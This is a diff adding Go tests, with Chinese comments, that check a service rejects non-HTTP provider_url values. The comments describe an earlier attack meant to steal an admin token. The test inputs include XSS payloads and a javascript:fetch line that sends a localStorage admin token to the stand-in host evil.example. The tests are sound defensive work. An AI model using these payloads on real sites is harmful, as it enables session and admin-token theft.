@@ -1711,3 +1711,86 @@ func TestApply_HistoricalDirtyBaseURL_FailsClosed(t *testing.T) {
 		t.Fatalf("fail-closed 后 CR 状态应仍为 pending，实际 %q", saved.Status)
 	}
 }
+
+// TestService_Submit_ProviderURLSchemeWhitelist 锁定 provider_url 协议白名单。
+//
+// 2026-07-25 的攻击流量往待审队列里放了 javascript:/data: 的 provider_url，
+// 载荷是读取 localStorage 里的 admin token。此前该字段全程无校验。
+func TestService_Submit_ProviderURLSchemeWhitelist(t *testing.T) {
+	ctx := context.Background()
+
+	bad := []string{
+		"javascript:alert(document.cookie)",
+		"data:text/html,<script>alert(1)</script>",
+		"ftp://example.com",
+		"",
+	}
+	for _, raw := range bad {
+		svc, _ := newTestService(t)
+		_, err := svc.Submit(ctx, &SubmitRequest{
+			APIKey:          "sk-test-key-12345",
+			TargetKey:       "testprov--cc--vip",
+			ProposedChanges: map[string]string{"provider_url": raw},
+		}, "127.0.0.1")
+		if err == nil {
+			t.Fatalf("provider_url=%q 应被拒绝，实际 nil", raw)
+		}
+		if !strings.Contains(err.Error(), "provider_url") {
+			t.Fatalf("provider_url=%q 期望协议拒因，实际: %v", raw, err)
+		}
+	}
+
+	svc, _ := newTestService(t)
+	if _, err := svc.Submit(ctx, &SubmitRequest{
+		APIKey:          "sk-test-key-12345",
+		TargetKey:       "testprov--cc--vip",
+		ProposedChanges: map[string]string{"provider_url": "https://example.com/path"},
+	}, "127.0.0.1"); err != nil {
+		t.Fatalf("合法 https provider_url 应被接受: %v", err)
+	}
+}
+
+// TestAdminApply_RejectsBadProviderURL 锁定 Apply 侧防御闸：历史脏数据 / 直改 DB
+// 绕过 Submit 校验时，Apply 必须在写 monitors.d/ 之前拒掉。
+//
+// 否则文件落盘、DB 标 applied，但整份配置在热加载时被拒（运行态静默保留旧配置），
+// 且下次重启直接起不来。断言不止于返回 error，还要求磁盘上的值原封未动。
+func TestAdminApply_RejectsBadProviderURL(t *testing.T) {
+	svc, store, ms := newApplyTestService(t)
+	seedMonitorFileChildFirst(t, ms, "prov--cc--chan")
+	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{
+		"provider_url": "javascript:fetch('https://evil.example/?t='+localStorage.getItem('relay-pulse-admin-token'))",
+	})
+
+	err := svc.AdminApply(context.Background(), cr.PublicID)
+	if err == nil {
+		t.Fatal("伪协议 provider_url 应在 Apply 前被拒，实际 nil")
+	}
+	if !strings.Contains(err.Error(), "provider_url") {
+		t.Fatalf("期望 provider_url 拒因，实际: %v", err)
+	}
+
+	mf, _ := ms.Get("prov--cc--chan")
+	if mf == nil {
+		t.Fatal("通道文件不应消失")
+	}
+	if got := mf.Monitors[1].ProviderURL; got != "" {
+		t.Fatalf("磁盘上的 provider_url 不应被写入，实际『%s』", got)
+	}
+}
+
+func TestValidateHTTPURL(t *testing.T) {
+	ok := []string{"https://a.com", "http://a.com:8080/x?y=1"}
+	bad := []string{"", "   ", "javascript:alert(1)", "data:text/html,x", "https://", "://nope"}
+
+	for _, raw := range ok {
+		if err := validateHTTPURL(raw); err != nil {
+			t.Fatalf("%q 应通过: %v", raw, err)
+		}
+	}
+	for _, raw := range bad {
+		if err := validateHTTPURL(raw); err == nil {
+			t.Fatalf("%q 应被拒绝", raw)
+		}
+	}
+}
